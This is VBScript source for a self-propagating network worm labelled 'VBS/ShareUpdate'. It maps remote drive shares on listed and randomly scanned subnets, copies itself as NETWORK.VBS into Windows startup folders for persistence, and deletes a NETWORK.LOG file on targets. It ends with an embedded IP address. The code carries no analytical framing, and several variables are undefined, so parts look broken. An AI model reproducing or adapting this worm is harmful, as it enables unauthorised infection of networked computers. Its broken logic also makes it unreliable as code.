'<----- VBS/ShareUpdate by FSO ----->
On Error Resume Next
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WshNet = CreateObject("WScript.Network")
Set ReadUs = FSO.OpenTextFile(WScript.ScriptFullName,1)
OC = ReadUs.ReadAll
sOC = InStr(1, OC, "'<----- VBS/ShareUpdate by FSO ----->")
eOC = InStrRev(OC, "'<----- Exit ShareUpdate ----->") + 31
Addrs = Mid(OC, eOC)
ListLen = Len(UC)
For X = 1 To 10
	ListLen = InStrRev(UC, "'", ListLen)
Next
Addrs = Right(OC, ListLen)
OldSpot = 1
Do
	FindNewAddr = InStr(1, Addrs, vbcrlf)
	Addr = Mid(Addrs, OldSpot, FindNewAddr)
	WNet.MapNetworkDrive "J:", "\\"&Addr&"\C"
	Tmp = "C:\"&FSO.GetTempName
	FSO.CopyFile "J:\NETWORK.VBS", Tmp
	If FSO.FileExists(Tmp) Then
		Set UpdDestroyIPs=FSO.OpenTextFile(Tmp,1)
		Tmp2 = "C:\"&FSO.GetTempName
		Set UpdAddWorm=FSO.CreateTextFile(Tmp2)
		UC = UpdDestroyIPs.ReadAll
		sUC = InStr(1, UC, "'<----- VBS/ShareUpdate by FSO ----->")
		eUC = InStrRev(UC, "'<----- Exit ShareUpdate ----->")
		UC = Mid(UC, sUC, eUC)
		UpdAddWorm.Write UC
		UpdAddWorm.Write Replace(Addrs, vbcrlf, vbcrlf&"'")
		UpdAddWorm.Close
		UpdDestroyIPs.Close
		FSO.CopyFile Tmp2, "C:\NETWORK.VBS"
		FSO.CopyFile Tmp2, "C:\WINDOWS\START MENU\PROGRAMS\STARTUP\NETWORK.VBS"
		FSO.CopyFile Tmp2, "C:\WIN95\START MENU\PROGRAMS\STARTUP\NETWORK.VBS"
		FSO.CopyFile Tmp2, "C:\WIN95\WINDOWS\START MENU\PROGRAMS\STARTUP\NETWORK.VBS"
		FSO.CopyFile Tmp2, "C:\WINNT\START MENU\PROGRAMS\STARTUP\NETWORK.VBS"
		FSO.CopyFile Tmp2, "C:\WINDOWS\NETWORK.VBS"
		FSO.CopyFile Tmp2, "C:\WIN95\NETWORK.VBS"
		FSO.CopyFile Tmp2, "C:\WINNT\NETWORK.VBS"
		FSO.DeleteFile Tmp, True
		FSO.DeleteFile Tmp2, True
	End If
	WNet.RemoveNetworkDrive "J:"
	Addr = FindNewAddr
Loop Until FindNewAddr = 0
Subnets = 0
Do Until WshNet.Domain = Empty
	Randomize
	If Subnets < 50 Then
		A = Int(Rnd * 15) + 198
	Else
		A = Int(Rnd * 254) + 1
	End If
	B = Int(Rnd * 254) + 1
	C = Int(Rnd * 254) + 1
	SN = A&"."&B&"."&C
	NL.WriteLine "Subnet: "&SN
	For X = 1 To 254
		On Error GoTo 0
		WshNet.MapNetworkDrive "J:", "\\"&SN&"."&X
		If Not Err.Number = 0 Then
			Err.Clear
			GoTo NextIP
		End If
		On Error Resume Next
		Tmp3 = "C:\"&FSO.GetTempName
		Set NTmp=FSO.CreateTextFile(Tmp3)
		NTmp.Write OC
		NTmp.Write Replace(Addrs, vbcrlf, vbcrlf&"'")
		NTmp.Close
		FSO.DeleteFile "J:\NETWORK.LOG"
		FSO.CopyFile Tmp3, "J:\NETWORK.VBS"
		FSO.CopyFile Tmp3, "J:\WINDOWS\START MENU\PROGRAMS\STARTUP\NETWORK.VBS"
		FSO.CopyFile Tmp3, "J:\WINDOWS\NETWORK.VBS"
		FSO.CopyFile Tmp3, "J:\WIN95\NETWORK.VBS"
		FSO.CopyFile Tmp3, "J:\WIN95\WINDOWS\NETWORK.VBS"
		FSO.CopyFile Tmp3, "J:\WIN95\START MENU\PROGRAMS\STARTUP\NETWORK.VBS"
		FSO.CopyFile Tmp3, "J:\WIN95\WINDOWS\START MENU\PROGRAMS\STARTUP\NETWORK.VBS"
		FSO.CopyFile Tmp3, "J:\WINNT\NETWORK.VBS"
		FSO.DeleteFile Tmp3, True
NextIP:
	Next
Loop
'<----- Exit ShareUpdate ----->
'207.193.186.166